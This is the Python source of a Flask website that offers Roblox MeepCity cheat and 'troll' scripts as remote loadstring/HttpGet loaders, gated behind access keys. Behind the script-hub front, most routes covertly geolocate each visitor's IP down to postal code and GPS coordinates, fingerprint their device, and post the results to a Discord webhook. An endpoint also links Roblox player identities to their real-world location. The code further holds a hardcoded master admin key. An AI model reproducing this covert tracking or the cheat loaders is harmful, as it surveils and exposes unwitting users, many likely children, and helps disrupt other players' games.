import os
import logging
import requests
import json
from flask import Flask, request, render_template, redirect, url_for, session, jsonify, flash
from werkzeug.middleware.proxy_fix import ProxyFix
from user_agents import parse
from datetime import datetime, timedelta
import hashlib
import time
import random
import string
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.orm import DeclarativeBase

# Configure logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

class Base(DeclarativeBase):
    pass

db = SQLAlchemy(model_class=Base)

# Create the app
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "dev-secret-key")
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)

# Database configuration
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get("DATABASE_URL")
app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {
    "pool_recycle": 300,
    "pool_pre_ping": True,
}
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Initialize database
db.init_app(app)

# Discord webhook configuration
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
KEY_GENERATOR_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")  # Use the same webhook for all notifications
DM_NOTIFICATION_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")

# Webhooks específicos para verificação
VERIFICACAO_CORRETA_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
VERIFICACAO_ERRO_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")

# Secret key for API authentication
API_SECRET_KEY = os.getenv("API_SECRET_KEY", "your-secret-api-key-here")

# Dictionary to track recent notifications (IP + timestamp)
recent_notifications = {}

# Import models after app creation
with app.app_context():
    from models import PrivateKey, AccessLog
    db.create_all()

# MeepCity Scripts Database
MEEPCITY_SCRIPTS = {
    'admin_commands': {
        'name': 'Admin Commands',
        'description': 'Powerful admin commands for MeepCity',
        'scripts': [
            {
                'name': 'MeepCity OP Commands',
                'description': 'Professional admin commands with teleport, time control, and more',
                'author': 'Exunys',
                'url': 'https://raw.githubusercontent.com/Exunys/MeepCity-Commands/main/Source.lua',
                'features': ['Teleport', 'Time Control', 'Custom Prefix', 'Player Management']
            },
            {
                'name': 'Advanced Admin Panel',
                'description': 'Complete admin interface with GUI controls',
                'author': 'UnitedHub',
                'url': 'loadstring(game:HttpGet("https://scriptblox.com/raw/MeepCity-MeepCity-OP-GUI-(TONS-OF-OP-FEATURES)-1629"))()',
                'features': ['GUI Interface', 'Player Controls', 'Game Manipulation', 'Settings Panel']
            }
        ]
    },
    'gui_scripts': {
        'name': 'GUI Scripts',
        'description': 'User-friendly interfaces with multiple features',
        'scripts': [
            {
                'name': 'MeepCity OP GUI',
                'description': 'Comprehensive GUI with coin generation and avatar editing',
                'author': 'ScriptBlox Community',
                'url': 'loadstring(game:HttpGet("https://scriptblox.com/raw/MeepCity-MeepCity-OP-GUI-(TONS-OF-OP-FEATURES)-1629"))()',
                'features': ['Coin Generator', 'Avatar Editor', 'Shop Manipulation', 'Free Features']
            },
            {
                'name': 'MeepCity Hub',
                'description': 'All-in-one hub with various game enhancements',
                'author': 'RScripts',
                'url': 'loadstring(game:HttpGet("https://rscripts.net/raw/meepcity-hub-D5xF"))()',
                'features': ['Infinite Jump', 'Giant Mode', 'Speed Boost', 'Balloon Spam']
            }
        ]
    },
    'troll_scripts': {
        'name': 'Troll Scripts',
        'description': 'Fun trolling features for entertainment',
        'scripts': [
            {
                'name': 'MeepCity Troll Pack',
                'description': 'Collection of trolling tools and effects',
                'author': 'Community',
                'url': 'loadstring(game:HttpGet("https://scriptblox.com/raw/MeepCity-meepcity-troll-and-free-plus-script-and-blur-4866"))()',
                'features': ['Snowball Spam', 'Fireworks', 'Sound Effects', 'Visual Trolls']
            },
            {
                'name': 'Game Destroyer',
                'description': 'Break game mechanics for ultimate trolling',
                'author': 'RScripts',
                'url': 'loadstring(game:HttpGet("https://rscripts.net/raw/meep-city-destroyer-break-the-entire-game-lmao-2544"))()',
                'features': ['UI Breaker', 'Physics Manipulation', 'Chaos Mode', 'Server Disruption']
            }
        ]
    },
    'free_features': {
        'name': 'Free Features',
        'description': 'Unlock premium features without payment',
        'scripts': [
            {
                'name': 'Free PLUS Script',
                'description': 'Get MeepCity PLUS membership features for free',
                'author': 'Community',
                'url': 'loadstring(game:HttpGet("https://scriptblox.com/raw/MeepCity-meepcity-script-free-plus-1196"))()',
                'features': ['PLUS Membership', 'Premium Items', 'Exclusive Areas', 'Special Privileges']
            },
            {
                'name': 'Coin Generator',
                'description': 'Generate unlimited coins instantly',
                'author': 'Cheater.fun',
                'url': 'loadstring(game:HttpGet("https://cheater.fun/raw/meepcity-coin-generator"))()',
                'features': ['Unlimited Coins', 'Instant Generation', 'Safe Method', 'Anti-Detection']
            }
        ]
    }
}

def should_send_notification(ip, notification_type, cooldown_minutes=5):
    """Check if we should send a notification based on cooldown"""
    key = f"{ip}_{notification_type}"
    current_time = time.time()
    
    # Clean old entries (older than 1 hour)
    keys_to_remove = []
    for k, timestamp in recent_notifications.items():
        if current_time - timestamp > 3600:  # 1 hour
            keys_to_remove.append(k)
    
    for k in keys_to_remove:
        del recent_notifications[k]
    
    # Check if we should send notification
    if key in recent_notifications:
        time_diff = current_time - recent_notifications[key]
        if time_diff < (cooldown_minutes * 60):  # Convert to seconds
            return False
    
    # Update timestamp
    recent_notifications[key] = current_time
    return True

def get_client_ip():
    """Get the real IP address of the client, considering proxies"""
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        ip = request.headers.get('X-Real-IP')
    else:
        ip = request.remote_addr
    return ip

def get_detailed_location_info(ip_address):
    """Get comprehensive location information from multiple APIs"""
    location_data = {
        'ip': ip_address,
        'country': 'Desconhecido',
        'country_code': 'N/A',
        'region': 'Desconhecido', 
        'city': 'Desconhecido',
        'postal_code': 'N/A',
        'latitude': 'N/A',
        'longitude': 'N/A',
        'timezone': 'N/A',
        'isp': 'Desconhecido',
        'org': 'Desconhecido',
        'as_name': 'N/A',
        'formatted_location': 'Localização não disponível'
    }
    
    # Skip localhost/private IPs
    if ip_address in ['127.0.0.1', 'localhost'] or ip_address.startswith('192.168.') or ip_address.startswith('10.'):
        logger.info(f"Skipping location lookup for private IP: {ip_address}")
        location_data['formatted_location'] = 'IP Local/Privado'
        return location_data
    
    # Try multiple APIs for maximum data coverage
    apis_to_try = [
        {
            'name': 'IP-API',
            'url': f'http://ip-api.com/json/{ip_address}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query',
            'parser': 'ipapi'
        },
        {
            'name': 'IPInfo',
            'url': f'https://ipinfo.io/{ip_address}/json',
            'parser': 'ipinfo'
        }
    ]
    
    for api in apis_to_try:
        try:
            logger.info(f"Tentando {api['name']} para IP {ip_address}")
            response = requests.get(api['url'], timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                
                if api['parser'] == 'ipapi' and data.get('status') == 'success':
                    location_data.update({
                        'country': data.get('country', 'Desconhecido'),
                        'country_code': data.get('countryCode', 'N/A'),
                        'region': data.get('regionName', 'Desconhecido'),
                        'city': data.get('city', 'Desconhecido'),
                        'postal_code': data.get('zip', 'N/A'),
                        'latitude': str(data.get('lat', 'N/A')),
                        'longitude': str(data.get('lon', 'N/A')),
                        'timezone': data.get('timezone', 'N/A'),
                        'isp': data.get('isp', 'Desconhecido'),
                        'org': data.get('org', 'Desconhecido'),
                        'as_name': data.get('as', 'N/A')
                    })
                    
                    # Format complete location
                    location_parts = []
                    if data.get('city') and data.get('city') != 'N/A':
                        location_parts.append(data['city'])
                    if data.get('regionName') and data.get('regionName') != 'N/A':
                        location_parts.append(data['regionName'])
                    if data.get('country') and data.get('country') != 'N/A':
                        location_parts.append(data['country'])
                    
                    location_data['formatted_location'] = ', '.join(location_parts) if location_parts else 'Localização não disponível'
                    logger.info(f"Dados obtidos com sucesso de {api['name']}")
                    break
                    
                elif api['parser'] == 'ipinfo' and 'city' in data:
                    loc = data.get('loc', 'N/A,N/A').split(',')
                    location_data.update({
                        'country': data.get('country', 'Desconhecido'),
                        'region': data.get('region', 'Desconhecido'),
                        'city': data.get('city', 'Desconhecido'),
                        'postal_code': data.get('postal', 'N/A'),
                        'latitude': loc[0] if len(loc) > 0 else 'N/A',
                        'longitude': loc[1] if len(loc) > 1 else 'N/A',
                        'timezone': data.get('timezone', 'N/A'),
                        'org': data.get('org', 'Desconhecido')
                    })
                    
                    # Format complete location
                    location_parts = []
                    if data.get('city'):
                        location_parts.append(data['city'])
                    if data.get('region'):
                        location_parts.append(data['region'])
                    if data.get('country'):
                        location_parts.append(data['country'])
                    
                    location_data['formatted_location'] = ', '.join(location_parts) if location_parts else 'Localização não disponível'
                    logger.info(f"Dados obtidos com sucesso de {api['name']}")
                    break
                    
        except requests.exceptions.RequestException as e:
            logger.warning(f"Falha ao obter localização de {api['name']}: {str(e)}")
            continue
        except Exception as e:
            logger.error(f"Erro ao processar dados de {api['name']}: {str(e)}")
            continue
    
    return location_data

def get_comprehensive_device_info():
    """Get comprehensive device, browser, and system information"""
    try:
        user_agent_string = request.headers.get('User-Agent', '')
        user_agent = parse(user_agent_string)
        
        # Get OS info
        os_family = user_agent.os.family or 'Desconhecido'
        os_version = user_agent.os.version_string or 'N/A'
        
        # Get browser info
        browser_family = user_agent.browser.family or 'Desconhecido'
        browser_version = user_agent.browser.version_string or 'N/A'
        
        # Device detection
        device_type = "Móvel" if user_agent.is_mobile else "Desktop"
        if user_agent.is_tablet:
            device_type = "Tablet"
        elif user_agent.is_bot:
            device_type = "Bot/Crawler"
        
        # Format detailed OS info
        os_info = f"{os_family}"
        if os_version and os_version != 'N/A':
            os_info += f" {os_version}"
            
        # Format detailed browser info
        browser_info = f"{browser_family}"
        if browser_version and browser_version != 'N/A':
            browser_info += f" {browser_version}"
        
        # Generate device fingerprint
        fingerprint_data = f"{user_agent_string}{request.headers.get('Accept-Language', '')}{request.headers.get('Accept-Encoding', '')}"
        device_fingerprint = hashlib.md5(fingerprint_data.encode()).hexdigest()[:12]
        
        # Get additional headers
        headers_info = {
            'accept_language': request.headers.get('Accept-Language', 'N/A'),
            'accept_encoding': request.headers.get('Accept-Encoding', 'N/A'),
            'connection': request.headers.get('Connection', 'N/A'),
            'cache_control': request.headers.get('Cache-Control', 'N/A'),
            'dnt': request.headers.get('DNT', 'N/A')
        }
        
        return {
            'user_agent': user_agent_string,
            'os_family': os_family,
            'os_version': os_version,
            'os_info': os_info,
            'browser_family': browser_family,
            'browser_version': browser_version,
            'browser_info': browser_info,
            'device_type': device_type,
            'is_mobile': user_agent.is_mobile,
            'is_tablet': user_agent.is_tablet,
            'is_bot': user_agent.is_bot,
            'device_fingerprint': device_fingerprint,
            'headers': headers_info
        }
        
    except Exception as e:
        logger.error(f"Erro ao obter informações do dispositivo: {str(e)}")
        return {
            'user_agent': 'Erro ao detectar',
            'os_info': 'Desconhecido',
            'browser_info': 'Desconhecido',
            'device_type': 'Desconhecido',
            'device_fingerprint': 'N/A',
            'headers': {}
        }

def send_discord_notification(webhook_url, message, username="UNITED HUB Monitor"):
    """Send notification to Discord webhook"""
    try:
        payload = {
            "username": username,
            "content": message
        }
        
        response = requests.post(webhook_url, json=payload, timeout=10)
        if response.status_code in [200, 204]:
            logger.info("Notificação Discord enviada com sucesso")
            return True
        else:
            logger.warning(f"Falha ao enviar notificação Discord: {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        logger.error(f"Erro ao enviar notificação Discord: {str(e)}")
        return False

def generate_unique_key(length=16):
    """Generate a unique key that doesn't exist in the database"""
    while True:
        # Generate random key
        characters = string.ascii_uppercase + string.digits
        key = ''.join(random.choice(characters) for _ in range(length))
        
        # Check if key already exists
        existing_key = PrivateKey.query.filter_by(key=key).first()
        if not existing_key:
            return key

def is_key_valid(key):
    """Check if a key is valid (exists and not expired)"""
    # Check master key first
    if key == "SEMNEXO134":
        return True
    
    # Check database key
    db_key = PrivateKey.query.filter_by(key=key).first()
    if db_key and db_key.is_valid():
        return True
    
    return False

def log_access(ip, user_agent, location_data, device_info, script_name=None, key_used=None, success=True):
    """Log access attempt to database"""
    try:
        access_log = AccessLog()
        access_log.ip_address = ip
        access_log.user_agent = user_agent
        access_log.location_data = json.dumps(location_data) if location_data else None
        access_log.device_info = json.dumps(device_info) if device_info else None
        access_log.accessed_script = script_name
        access_log.key_used = key_used
        access_log.success = success
        
        db.session.add(access_log)
        db.session.commit()
    except Exception as e:
        logger.error(f"Erro ao registrar acesso: {str(e)}")
        db.session.rollback()
        db.session.rollback()

# Routes
@app.route('/')
def index():
    """Main page with access tracking and key verification"""
    ip = get_client_ip()
    location_data = get_detailed_location_info(ip)
    device_info = get_comprehensive_device_info()
    
    # Send notification if not in cooldown
    if should_send_notification(ip, 'site_access'):
        # Create detailed message for webhook
        dm_message = f"""🌐 **NOVO ACESSO AO SITE - UNITED HUB**

👤 **LOCALIZAÇÃO DETALHADA**
🌍 IP: {location_data['ip']}
📍 Localização Completa: {location_data['formatted_location']}
🏙️ Cidade: {location_data['city']}
🏛️ Estado/Região: {location_data['region']}
🌎 País: {location_data['country']} ({location_data['country_code']})
📮 CEP: {location_data['postal_code']}
📍 Coordenadas GPS: {location_data['latitude']}, {location_data['longitude']}
🕰️ Timezone: {location_data['timezone']}
🌐 Provedor (ISP): {location_data['isp']}
🏢 Organização: {location_data['org']}
📡 AS Network: {location_data['as_name']}

💻 **DISPOSITIVO USADO**
🖥️ Sistema: {device_info['os_info']}
🌐 Navegador: {device_info['browser_info']}
📱 Tipo: {device_info['device_type']}
🔍 Device ID: {device_info['device_fingerprint']}
🗣️ Idioma: {device_info['headers']['accept_language']}

⏰ **Timestamp:** {datetime.utcnow().strftime('%d/%m/%Y %H:%M:%S')} UTC
🔥 **STATUS:** SITE ACESSADO"""

        # Send to webhook
        if DISCORD_WEBHOOK_URL:
            send_discord_notification(DISCORD_WEBHOOK_URL, dm_message)
    
    return render_template('index.html')

@app.route('/verify', methods=['GET', 'POST'])
def verify_key():
    """Verify private key"""
    if request.method == 'POST':
        key = request.form.get('key', '').strip().upper()
        
        if not key:
            flash('Por favor, insira uma chave válida.', 'error')
            return render_template('verify.html')
        
        # Get user information
        ip = get_client_ip()
        location_data = get_detailed_location_info(ip)
        device_info = get_comprehensive_device_info()
        
        # Log access attempt
        log_access(ip, device_info.get('user_agent'), location_data, device_info, key_used=key, success=False)
        
        if is_key_valid(key):
            # Update key usage if it's from database
            if key != "SEMNEXO134":
                db_key = PrivateKey.query.filter_by(key=key).first()
                if db_key:
                    db_key.usage_count += 1
                    db.session.commit()
            
            # Store key in session
            session['verified_key'] = key
            session['verified_at'] = datetime.utcnow().isoformat()
            
            # Log successful verification
            log_access(ip, device_info.get('user_agent'), location_data, device_info, key_used=key, success=True)
            
            # Send Discord notification
            if should_send_notification(ip, "verification_success"):
                success_message = f"""✅ **VERIFICAÇÃO APROVADA - UNITED HUB**

🔑 **Key:** {key}
👤 **IP:** {location_data['ip']}
📍 **Localização:** {location_data['formatted_location']}
🏙️ Cidade: {location_data['city']}
🏛️ Estado/Região: {location_data['region']}
🌎 País: {location_data['country']} ({location_data['country_code']})
📮 CEP: {location_data['postal_code']}
📍 Coordenadas GPS: {location_data['latitude']}, {location_data['longitude']}
🕰️ Timezone: {location_data['timezone']}
🌐 Provedor (ISP): {location_data['isp']}
💻 **Dispositivo:** {device_info['os_info']} - {device_info['browser_info']}
📱 Tipo: {device_info['device_type']}
🔍 Device ID: {device_info['device_fingerprint']}
⏰ **Horário:** {datetime.utcnow().strftime('%d/%m/%Y %H:%M:%S')} UTC

🎯 **STATUS:** ACESSO LIBERADO"""
                
                if VERIFICACAO_CORRETA_WEBHOOK_URL:
                    send_discord_notification(VERIFICACAO_CORRETA_WEBHOOK_URL, success_message)
            
            flash('Chave verificada com sucesso! Acesso liberado.', 'success')
            return redirect(url_for('scripts'))
            
        else:
            # Send Discord notification for failed verification
            if should_send_notification(ip, "verification_failed"):
                fail_message = f"""❌ **VERIFICAÇÃO FALHADA - UNITED HUB**

🔑 **Key Tentativa:** {key}
👤 **IP:** {location_data['ip']}
📍 **Localização:** {location_data['formatted_location']}
🏙️ Cidade: {location_data['city']}
🏛️ Estado/Região: {location_data['region']}
🌎 País: {location_data['country']} ({location_data['country_code']})
📮 CEP: {location_data['postal_code']}
📍 Coordenadas GPS: {location_data['latitude']}, {location_data['longitude']}
🕰️ Timezone: {location_data['timezone']}
🌐 Provedor (ISP): {location_data['isp']}
💻 **Dispositivo:** {device_info['os_info']} - {device_info['browser_info']}
📱 Tipo: {device_info['device_type']}
🔍 Device ID: {device_info['device_fingerprint']}
⏰ **Horário:** {datetime.utcnow().strftime('%d/%m/%Y %H:%M:%S')} UTC

🎯 **STATUS:** KEY INVÁLIDA OU EXPIRADA"""
                
                if VERIFICACAO_ERRO_WEBHOOK_URL:
                    send_discord_notification(VERIFICACAO_ERRO_WEBHOOK_URL, fail_message)
            
            flash('Chave inválida ou expirada. Tente novamente.', 'error')
    
    return render_template('verify.html')

@app.route('/scripts')
def scripts():
    """Scripts page - requires verification"""
    if 'verified_key' not in session:
        flash('Você precisa verificar sua chave primeiro.', 'warning')
        return redirect(url_for('verify_key'))
    
    # Check if verification is still valid (24 hours)
    verified_at = datetime.fromisoformat(session.get('verified_at', '1970-01-01T00:00:00'))
    if datetime.utcnow() - verified_at > timedelta(hours=24):
        session.pop('verified_key', None)
        session.pop('verified_at', None)
        flash('Sua verificação expirou. Por favor, verifique sua chave novamente.', 'warning')
        return redirect(url_for('verify_key'))
    
    return render_template('scripts.html', scripts=MEEPCITY_SCRIPTS)

@app.route('/script/<category>/<int:script_id>')
def get_script(category, script_id):
    """Get specific script - requires verification"""
    if 'verified_key' not in session:
        return jsonify({'error': 'Não autorizado'}), 401
    
    if category not in MEEPCITY_SCRIPTS:
        return jsonify({'error': 'Categoria não encontrada'}), 404
    
    scripts = MEEPCITY_SCRIPTS[category]['scripts']
    if script_id >= len(scripts):
        return jsonify({'error': 'Script não encontrado'}), 404
    
    script = scripts[script_id]
    
    # Log script access
    ip = get_client_ip()
    location_data = get_detailed_location_info(ip)
    device_info = get_comprehensive_device_info()
    log_access(ip, device_info.get('user_agent'), location_data, device_info, 
               script_name=script['name'], key_used=session.get('verified_key'), success=True)
    
    # Send Discord notification
    if should_send_notification(ip, "script_access", cooldown_minutes=10):
        message = f"""📥 **SCRIPT ACESSADO** 📥
**Script:** {script['name']}
**Categoria:** {MEEPCITY_SCRIPTS[category]['name']}
**Chave:** `{session.get('verified_key')}`
**IP:** `{ip}`
**Localização:** {location_data.get('formatted_location', 'N/A')}
**Dispositivo:** {device_info.get('device_type', 'N/A')} - {device_info.get('os_info', 'N/A')}
**Timestamp:** {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"""
        
        send_discord_notification(DISCORD_WEBHOOK_URL, message)
    
    return jsonify({
        'name': script['name'],
        'description': script['description'],
        'author': script['author'],
        'url': script['url'],
        'features': script['features']
    })

@app.route('/admin')
def admin():
    """Admin panel - requires master key"""
    if session.get('verified_key') != 'SEMNEXO134':
        flash('Acesso negado. Apenas administradores.', 'error')
        return redirect(url_for('index'))
    
    # Get recent access logs
    recent_logs = AccessLog.query.order_by(AccessLog.timestamp.desc()).limit(50).all()
    
    # Get key statistics
    total_keys = PrivateKey.query.count()
    active_keys = PrivateKey.query.filter_by(is_active=True).count()
    
    return render_template('admin.html', logs=recent_logs, total_keys=total_keys, active_keys=active_keys)

@app.route('/admin/generate_key', methods=['POST'])
def generate_key():
    """Generate new private key - admin only"""
    if session.get('verified_key') != 'SEMNEXO134':
        return jsonify({'error': 'Não autorizado'}), 401
    
    description = request.form.get('description', '')
    max_usage = request.form.get('max_usage', type=int)
    expires_days = request.form.get('expires_days', type=int)
    
    # Generate new key
    new_key = generate_unique_key()
    
    # Calculate expiration date
    expires_at = None
    if expires_days:
        expires_at = datetime.utcnow() + timedelta(days=expires_days)
    
    # Create key record
    private_key = PrivateKey()
    private_key.key = new_key
    private_key.description = description
    private_key.max_usage = max_usage
    private_key.expires_at = expires_at
    private_key.created_by = 'Admin'
    
    try:
        db.session.add(private_key)
        db.session.commit()
        
        # Send Discord notification
        message = f"""🔑 **NOVA CHAVE GERADA** 🔑
**Chave:** `{new_key}`
**Descrição:** {description or 'N/A'}
**Uso Máximo:** {max_usage or 'Ilimitado'}
**Expira em:** {expires_at.strftime('%Y-%m-%d') if expires_at else 'Nunca'}
**Criada por:** Admin
**Timestamp:** {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"""
        
        send_discord_notification(KEY_GENERATOR_WEBHOOK_URL, message)
        
        flash(f'Chave gerada com sucesso: {new_key}', 'success')
        
    except Exception as e:
        db.session.rollback()
        logger.error(f"Erro ao gerar chave: {str(e)}")
        flash('Erro ao gerar chave. Tente novamente.', 'error')
    
    return redirect(url_for('admin'))

@app.route('/logout')
def logout():
    """Logout user"""
    session.pop('verified_key', None)
    session.pop('verified_at', None)
    flash('Logout realizado com sucesso.', 'info')
    return redirect(url_for('index'))

@app.route('/generate-public-key')
def generate_public_key():
    """Generate a public key for testing"""
    new_key = generate_unique_key()
    expires_at = datetime.utcnow() + timedelta(hours=24)
    
    # Save to database
    private_key = PrivateKey()
    private_key.key = new_key
    private_key.description = "Chave pública de teste"
    private_key.created_by = "Sistema Público"
    private_key.expires_at = expires_at
    
    db.session.add(private_key)
    db.session.commit()
    
    # Send notification
    notification_message = f"""🔑 **KEY PÚBLICA GERADA**

**🎯 Key:** `{new_key}`
**⏰ Expira:** {expires_at.strftime('%d/%m/%Y %H:%M')} UTC
**🕒 Duração:** 24 horas
**👤 Gerada por:** Sistema Público

⚠️ **Esta é uma key de teste pública**"""

    if KEY_GENERATOR_WEBHOOK_URL:
        send_discord_notification(KEY_GENERATOR_WEBHOOK_URL, notification_message)
    
    return jsonify({
        'success': True,
        'key': new_key,
        'expires_at': expires_at.isoformat(),
        'expires_formatted': expires_at.strftime('%d/%m/%Y às %H:%M UTC'),
        'message': 'Key pública gerada com sucesso'
    })

@app.route('/api/roblox-execution', methods=['POST'])
def roblox_execution():
    """Handle Roblox script execution data"""
    try:
        # Get client IP and location
        ip = get_client_ip()
        location_data = get_detailed_location_info(ip)
        device_info = get_comprehensive_device_info()
        
        # Get Roblox data
        roblox_data = request.get_json()
        
        if not roblox_data:
            return jsonify({'error': 'No data received'}), 400
        
        # Create detailed Discord message
        main_message = f"""🎮 **SCRIPT ROBLOX EXECUTADO - UNITED HUB**

👤 **DADOS DO JOGADOR**
🆔 Nome: {roblox_data.get('player_name', 'N/A')}
📛 Nome Display: {roblox_data.get('player_display_name', 'N/A')}
🔢 ID do Jogador: {roblox_data.get('player_id', 'N/A')}
⏳ Idade da Conta: {roblox_data.get('account_age', 'N/A')} dias
💎 Membership: {roblox_data.get('membership_type', 'N/A')}

🎯 **DADOS DO JOGO**
🎮 ID do Jogo: {roblox_data.get('game_id', 'N/A')}
🏠 Place ID: {roblox_data.get('place_id', 'N/A')}
📝 Nome do Jogo: {roblox_data.get('game_name', 'N/A')}
🌐 Server ID: {str(roblox_data.get('server_id', 'N/A'))[:20]}...
🌍 Região do Server: {roblox_data.get('server_region', 'N/A')}

💻 **INFORMAÇÕES TÉCNICAS**
📱 Plataforma: {roblox_data.get('platform', 'N/A')}
📲 Mobile: {'Sim' if roblox_data.get('is_mobile') else 'Não'}
🎮 Gamepad: {'Sim' if roblox_data.get('is_gamepad') else 'Não'}
⌨️ Teclado: {'Sim' if roblox_data.get('is_keyboard') else 'Não'}
🥽 VR: {'Sim' if roblox_data.get('is_vr') else 'Não'}
🎨 Qualidade Gráfica: {roblox_data.get('graphics_quality', 'N/A')}
💾 Uso de Memória: {roblox_data.get('memory_usage', 'N/A')} MB

🌐 **LOCALIZAÇÃO REAL DO JOGADOR**
🌍 IP: {location_data['ip']}
📍 Localização Completa: {location_data['formatted_location']}
🏙️ Cidade: {location_data['city']}
🏛️ Estado/Região: {location_data['region']}
🌎 País: {location_data['country']} ({location_data['country_code']})
📮 CEP: {location_data['postal_code']}
📍 Coordenadas GPS: {location_data['latitude']}, {location_data['longitude']}
🕰️ Timezone: {location_data['timezone']}
🌐 Provedor (ISP): {location_data['isp']}

💻 **DISPOSITIVO USADO**
🖥️ Sistema: {device_info['os_info']}
🌐 Navegador: {device_info['browser_info']}
📱 Tipo: {device_info['device_type']}
🔍 Device ID: {device_info['device_fingerprint']}

⏰ **Timestamp:** {roblox_data.get('formatted_time', datetime.utcnow().strftime('%d/%m/%Y %H:%M:%S'))}
🔥 **STATUS:** SCRIPT EXECUTADO COM SUCESSO"""

        # Log the execution
        log_access(ip, device_info.get('user_agent'), location_data, device_info, 
                  script_name=f"Roblox - {roblox_data.get('game_name', 'N/A')}", success=True)

        # Send to webhook
        if DISCORD_WEBHOOK_URL:
            send_discord_notification(DISCORD_WEBHOOK_URL, main_message)
        
        return jsonify({
            'success': True,
            'message': 'Dados recebidos e processados com sucesso',
            'player': roblox_data.get('player_name', 'N/A'),
            'location': location_data['formatted_location']
        })
        
    except Exception as e:
        logger.error(f"Erro ao processar dados do Roblox: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/cleanup-keys')
def cleanup_keys():
    """Remove expired keys"""
    try:
        expired_keys = PrivateKey.query.filter(PrivateKey.expires_at < datetime.utcnow()).all()
        count = len(expired_keys)
        
        for key in expired_keys:
            db.session.delete(key)
        
        db.session.commit()
        
        return jsonify({
            'success': True,
            'cleaned_keys': count,
            'message': f'{count} keys expiradas foram removidas'
        })
    except Exception as e:
        logger.error(f"Erro ao limpar keys: {str(e)}")
        return jsonify({'error': 'Erro interno'}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
